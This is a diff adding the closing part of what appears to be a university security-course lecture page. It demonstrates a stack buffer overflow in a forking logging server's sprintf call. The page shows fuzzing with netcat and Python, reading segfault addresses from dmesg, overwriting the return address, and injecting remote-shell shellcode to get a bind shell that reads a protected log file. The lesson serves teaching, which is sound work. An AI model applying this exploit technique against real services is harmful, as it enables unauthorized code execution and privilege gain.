+    <span style="color: #00ffff;">return</span> 1;
+  }
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">set up listening queue</span>
+  listen(server,4);
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">accept incoming connection</span>
+  <span style="color: #00ffff;">while</span> (1){
+    client = accept(server, <span style="color: #7fffd4;">NULL</span>,<span style="color: #7fffd4;">NULL</span>);
+    <span style="color: #00ffff;">if</span>( client &lt; 0 ){
+   perror(<span style="color: #ffa07a;">"accept"</span>);
+   <span style="color: #00ffff;">break</span>;
+    }
+
+    <span style="color: #00ffff;">if</span>( fork() == 0){
+   <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">handle each client in the child</span>
+   handle_client(client);
+    }
+  }
+  <span style="color: #00ffff;">return</span> 0;
+}
+</pre>
+</div>
+
+<p>
+The gist of the program is that the server waits for new incoming
+connections, and for each client, forks a new logging util that
+will open the log file and deposit the message. Looking closely, we
+see that <code>logmsg()</code> function has a vulnerability when calling
+<code>sprintf()</code>. the Length of the msg is never checked with respect to
+the length of the <code>event</code> buffer.
+</p>
+
+<p>
+Consider how this tool might be used on a host machine. The logging
+server has access to the log file that the client cannot
+read. However, the server allows a client to write to the file. The
+goal of the nefarious client is to gain access to the log fiel,
+essentially, to gain the privilege level of the server.
+</p>
+
+<p>
+Let's consider how to do this, by first starting the server in one
+terminal and probing it in another, when we connect we see the
+following:
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ netcat localhost 2525
+Hello 0.5.119.183: Send log message
+loging
+
+[1445621763] loging
+
+
+Goodbye!
+</pre>
+
+<p>
+Let's start sending it a bit more stuff &#x2026;
+</p>
+<pre class="example">
+user@si485H-base:demo$ python -c "print 'A'*50" | netcat localhost 2525
+Hello 0.5.119.183: Send log message
+[1445621810] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`?AAAAAAAAA
+
+^C
+</pre>
+
+<p>
+That seemed to cause a problem, so lets check the dmesg output:
+</p>
+<pre class="example">
+   user@si485H-base:demo$ dmesg | tail -1
+[2877400.157327] logger[23967]: segfault at a0a35 ip 08048af3 sp bfe11eb0 error 4 in logger[8048000+1000]
+</pre>
+
+<p>
+There you go, we see that we caused a segfault. Notice the ip is
+still mostly intact, so let's increase the length of our string
+until we see 0xdeadbeef for the ip.
+</p>
+
+<pre class="example">
+   user@si485H-base:demo$ python -c "print 'A'*50 + '\xef\xbe\xad\xde'" | netcat localhost 2525
+Hello 0.5.119.183: Send log message
+[1445621998] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`?AAAAAAAAAﾭ?
+
+^C
+user@si485H-base:demo$ dmesg | tail -1
+[2877588.654685] logger[24018]: segfault at a0ade ip 000a0ade sp bfe11eb0 error 14 in logger[8048000+1000]
+user@si485H-base:demo$ python -c "print 'A'*51 + '\xef\xbe\xad\xde'" | netcat localhost 2525
+Hello 0.0.0.0: Send log message
+^C^C
+user@si485H-base:demo$ dmesg | tail -1
+[2877595.667371] logger[24024]: segfault at a0adead ip 0a0adead sp bfe11eb0 error 14
+user@si485H-base:demo$ python -c "print 'A'*52 + '\xef\xbe\xad\xde'" | netcat localhost 2525
+Hello 0.5.119.183: Send log message
+^C
+user@si485H-base:demo$ dmesg | tail -1
+[2877604.881940] logger[24030]: segfault at adeadbe ip 0adeadbe sp bfe11eb0 error 14
+user@si485H-base:demo$ python -c "print 'A'*53 + '\xef\xbe\xad\xde'" | netcat localhost 2525
+Hello 0.5.119.183: Send log message
+^C
+user@si485H-base:demo$ dmesg | tail -1
+[2877612.426441] logger[24036]: segfault at deadbeef ip deadbeef sp bfe11eb0 error 15
+</pre>
+
+<p>
+Now we are at the instruction pointer, and also notice that the
+stack pointer has been consistent the whole time. Now all we need
+to do is add in some shell code, perhaps our remote shell code
+would do. But where do we set the return address, well to whereever
+we crashd on the stack! The address, 0xbfe11eb0:
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ printf `./hexify.sh assembly_rsh` &gt; shellcode
+user@si485H-base:demo$ python -c "print 'A'*53 + '\xb0\x1e\xe1\xbf'+open('shellcode').read().strip()" | netcat localhost 2525
+Hello 0.5.119.183: Send log message
+^C
+</pre>
+
+<p>
+It looks like it might have not worked, but if you look at the
+dmesg output, you see there is no <i>new</i> segfault:
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ dmesg | tail -1
+[2877708.087115] logger[24055]: segfault at deadbeef ip deadbeef sp bfe11eb0 error 15
+</pre>
+
+<p>
+So lets try connecting to our remote shell:
+</p>
+
+<pre class="example">
+   user@si485H-base:demo$ netcat localhost 31337
+ls log.dat
+log.dat
+cat log.dat
+[1445621763] loging
+
+
+[1445621810] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`?AAAAAAAAA
+
+[1445621927] 
+[1445621931] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`?AAAAAAAAAﾭ?
+
+[1445621939] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`?AAAAAAAAAAAAAAﾭ?
+
+[1445621947] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`?AAAAAAAAAAAAAAAAAAﾭ?
+
+[1445621957] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`?AAAAAAAAAAAAAAAAﾭ?
+
+[1445621967] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`?AAAAAAAAAAAAAAﾭ?
+
+[1445621979] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`?AAAAAAAAAAAAAAAAﾭ?
+
+[1445621988] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`?AAAAAAAAAAAAAAAﾭ?
+
+[1445621998] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`?AAAAAAAAAﾭ?
+
+[1445622005] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`?AAAAAAAAAAﾭ?
+
+[1445622014] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`?AAAAAAAAAAAﾭ?
+
+[1445622022] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`?AAAAAAAAAAAAﾭ?
+
+[1445622117] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP?AAAAAAAAAAAAﾭ?1?Pjj??1?C?f̀??1?Pfhzifj??jQV1۳??f̀1ɱQV??1۳1??f̀1?QQV??1۳1??f̀?Ɖ?1?1???̀A1???̀A1???̀1???Qh//shh/bin??
+                                                                                                                                                                ̀
+
+[1445622202] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP?AAAAAAAAAAAA??1?Pjj??1?C?f̀??1?Pfhzifj??jQV1۳??f̀1ɱQV??1۳1??f̀1?QQV??1۳1??f̀?Ɖ?1?1???̀A1???̀A1???̀1???Qh//shh/bin??
+                                                                                                                                                                ̀
+</pre>
+
+<p>
+BOOM! We got a remote shell and access to the log file and address
+space randomization was not a problem because we learned the base.
+</p>
+</div>
+</div>
+</div>
+</div>
+</body>
+</html>
